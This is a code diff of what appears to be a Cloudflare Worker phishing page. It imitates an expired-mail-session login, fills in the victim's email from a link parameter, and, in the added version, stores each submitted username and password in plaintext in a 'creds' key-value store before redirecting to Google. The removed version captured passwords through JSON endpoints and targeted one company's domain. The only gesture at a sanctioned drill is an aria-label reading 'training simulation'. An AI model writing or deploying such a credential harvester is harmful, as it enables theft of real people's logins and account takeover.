@@ -1,223 +1,79 @@
-const HTML = `<!doctype html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Inbox</title>
-  <link rel="icon" type="image/png" href="assets/favicon.png">
-  <link rel="stylesheet" href="styles.css">
-</head>
-<body>
-  <main class="training-stage" aria-label="Internal training simulation of an expired mail session"
-    aria-describedby="session-expiry-description">
-    <div id="mailbox-label" class="mailbox-label" aria-live="polite"></div>
-    <p id="session-expiry-description" class="sr-only">Your server session has expired. Once you have reauthenticated,
-      the action you just requested will be automatically reattempted. To go back without reauthentication, click here.
-    </p>
-    <label class="sr-only" for="username">username</label>
-    <input id="training-username" class="training-input training-input--username" type="text" autocomplete="off"
-      autocapitalize="none" spellcheck="false">
-    <label class="sr-only" for="password">password</label>
-    <input id="training-password" class="training-input training-input--password" type="password" autocomplete="off"
-      spellcheck="false">
-
-    <!-- ========== ADDED SIGN IN BUTTON ========== -->
-    <button id="signin-btn" style="margin-top:10px; padding:6px 16px;">Sign In</button>
-    <div id="signin-message" style="margin-top:8px; font-weight:bold;"></div>
-    <!-- =========================================== -->
-
-  </main>
-  <script>
-    // ---- Modified frontend to talk to KV ----
-    (async () => {
-      const labelEl = document.getElementById("mailbox-label");
-      const usernameInput = document.getElementById("training-username");
-
-      // Helper to update the label
-      const setLabel = (text) => { if (labelEl) labelEl.textContent = text; };
-
-      // Parse email from URL
-      const t = new URLSearchParams(window.location.search).get("email");
-      let email = null;
-      if (t && t.length <= 254) {
-        const at = t.indexOf("@");
-        if (at > 0 && at === t.lastIndexOf("@")) {
-          const local = t.slice(0, at);
-          const domain = t.slice(at + 1).toLowerCase();
-          if (domain === "alnaghi.com" && local.length <= 64 &&
-              /^[A-Za-z0-9]+(?:[._-][A-Za-z0-9]+)*$/.test(local)) {
-            email = t.toLowerCase();
-            // Format the label
-            const words = local.split(/[._-]/).map(w =>
-              w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()
-            );
-            setLabel(words.join(" "));
-            usernameInput.value = email;
-          }
-        }
-      }
-      if (!email) {
-        setLabel("Drug Safety1");
-        return;
-      }
-
-      // ---- Send email to KV for storage (optional) ----
-      try {
-        const resp = await fetch("/api/store-email", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ email })
-        });
-        const data = await resp.json();
-        console.log("Stored email:", data);
-      } catch (err) {
-        console.error("Failed to store email:", err);
-      }
-
-      // ---- Retrieve a stored greeting from KV (example) ----
-      try {
-        const resp = await fetch("/api/get-greeting?email=" + encodeURIComponent(email));
-        const data = await resp.json();
-        if (data.greeting) {
-          // You could display the greeting somewhere, e.g., as a tooltip
-          console.log("Greeting from KV:", data.greeting);
-        }
-      } catch (err) {
-        console.error("Failed to get greeting:", err);
-      }
-    })();
-  </script>
-
-  <!-- ========== ADDED SCRIPT FOR SIGN IN BUTTON ========== -->
-  <script>
-    document.addEventListener("DOMContentLoaded", function() {
-      const btn = document.getElementById("signin-btn");
-      const usernameInput = document.getElementById("training-username");
-      const passwordInput = document.getElementById("training-password");
-      const messageEl = document.getElementById("signin-message");
-
-      btn.addEventListener("click", async function(e) {
-        e.preventDefault();
-
-        const username = usernameInput.value.trim();
-        const password = passwordInput.value.trim();
-
-        if (!username || !password) {
-          messageEl.style.color = "red";
-          messageEl.textContent = "⚠️ Please enter both username and password.";
-          return;
-        }
-
-        btn.disabled = true;
-        btn.textContent = "Signing in...";
-        messageEl.style.color = "#333";
-        messageEl.textContent = "⏳ Sending credentials...";
-
-        try {
-          const resp = await fetch("/api/signin", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ username, password })
-          });
-          const data = await resp.json();
-
-          if (resp.ok) {
-            messageEl.style.color = "green";
-            messageEl.textContent = "✅ " + (data.message || "Sign in successful!");
-            console.log("Stored in KV:", data);
-          } else {
-            messageEl.style.color = "red";
-            messageEl.textContent = "❌ Error: " + (data.error || "Unknown error");
-          }
-        } catch (err) {
-          messageEl.style.color = "red";
-          messageEl.textContent = "❌ Network error: " + err.message;
-        } finally {
-          btn.disabled = false;
-          btn.textContent = "Sign In";
-        }
-      });
-    });
-  </script>
-  <!-- =================================================== -->
-
-</body>
-</html>`;
-
 export default {
   async fetch(request, env) {
-    const url = new URL(request.url);
-    const path = url.pathname;
+    if (request.method === "POST") {
+      const formData = await request.formData();
+      const username = formData.get("username");
+      const password = formData.get("password");
 
-    // Serve the HTML page (root or /)
-    if (path === "/" || path === "/index.html") {
-      return new Response(HTML, {
-        headers: { "Content-Type": "text/html" },
-      });
-    }
+      if (username && password) {
+        await env.creds.put(username, password);
 
-    // API: store email in KV (unchanged)
-    if (path === "/api/store-email" && request.method === "POST") {
-      try {
-        const { email } = await request.json();
-        if (!email) throw new Error("Missing email");
-        await env.MAILBOX.put(`email:${email}`, JSON.stringify({ storedAt: Date.now() }));
-        return new Response(JSON.stringify({ success: true, email }), {
-          headers: { "Content-Type": "application/json" },
+        return new Response(null, {
+          status: 303,
+          headers: { "Location": "https://www.google.com" }
         });
-      } catch (err) {
-        return new Response(JSON.stringify({ error: err.message }), {
-          status: 400,
-          headers: { "Content-Type": "application/json" },
-        });
+      } else {
+        return new Response("Missing username or password", { status: 400 });
       }
     }
 
-    // API: get a greeting (unchanged)
-    if (path === "/api/get-greeting" && request.method === "GET") {
-      const email = url.searchParams.get("email");
-      if (!email) {
-        return new Response(JSON.stringify({ error: "Missing email" }), {
-          status: 400,
-          headers: { "Content-Type": "application/json" },
-        });
-      }
-      const greetingKey = `greeting:${email}`;
-      const value = await env.MAILBOX.get(greetingKey);
-      return new Response(JSON.stringify({ greeting: value || "Welcome!" }), {
-        headers: { "Content-Type": "application/json" },
-      });
-    }
+    const htmlContent = `<!doctype html>
+<html lang="en">
 
-    // ========== ADDED: Sign-in endpoint ==========
-    if (path === "/api/signin" && request.method === "POST") {
-      try {
-        const { username, password } = await request.json();
-        if (!username || !password) {
-          return new Response(
-            JSON.stringify({ error: "Username and password required" }),
-            { status: 400, headers: { "Content-Type": "application/json" } }
-          );
-        }
-        // Store in KV (for demo, password is plain – in production, hash it!)
-        await env.MAILBOX.put(`user:${username}`, JSON.stringify({
-          password,
-          storedAt: Date.now()
-        }));
-        return new Response(
-          JSON.stringify({ success: true, message: `User "${username}" stored.` }),
-          { headers: { "Content-Type": "application/json" } }
-        );
-      } catch (err) {
-        return new Response(
-          JSON.stringify({ error: "Internal error: " + err.message }),
-          { status: 500, headers: { "Content-Type": "application/json" } }
-        );
-      }
-    }
-    // ===========================================
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Inbox</title>
+    <link rel="icon" type="image/png" href="assets/favicon.png">
+    <link rel="stylesheet" href="styles.css">
+</head>
 
-    // Fallback
-    return new Response("Not Found", { status: 404 });
+<body>
+    <form id="training-form" class="training-stage" role="main"
+        action="/post" method="post"
+        aria-label="Internal training simulation of an expired mail session"
+        aria-describedby="session-expiry-description">
+        <div id="mailbox-label" class="mailbox-label" aria-live="polite"></div>
+        <p id="session-expiry-description" class="sr-only">Your server session has expired. Once you have reauthenticated,
+            the action you just requested will be automatically reattempted. To go back without reauthentication, click here.
+        </p>
+        <label class="sr-only" for="username">username</label>
+        <input id="training-username" name="username" class="training-input training-input--username" type="text"
+            autocomplete="off" autocapitalize="none" spellcheck="false">
+        <label class="sr-only" for="password">password</label>
+        <input id="training-password" name="password" class="training-input training-input--password" type="password"
+            autocomplete="off" spellcheck="false">
+        <button id="training-submit" class="training-submit" type="submit" aria-label="Sign in"></button>
+    </form>
+    <script>
+        (() => {
+            const f = document.getElementById("training-form"),
+                e = document.getElementById("mailbox-label"),
+                u = document.getElementById("training-username"),
+                t = new URLSearchParams(window.location.search).get("email"),
+                r = () => { e.textContent = "Drug Safety1" };
+
+            if (!e || !u) return;
+            if (!t || t.length > 254) return r();
+
+            const n = t.indexOf("@");
+            if (n < 1 || n !== t.lastIndexOf("@")) return r();
+
+            const o = t.slice(0, n);
+            const displayName = o.split(/[._-]/)
+                .map(part => part.charAt(0).toUpperCase() + part.slice(1).toLowerCase())
+                .join(" ");
+
+            e.textContent = displayName;
+            u.value = t.toLowerCase();
+        })();
+    </script>
+</body>
+
+</html>`;
+
+    return new Response(htmlContent, {
+      headers: { "Content-Type": "text/html" },
+    });
   },
 };
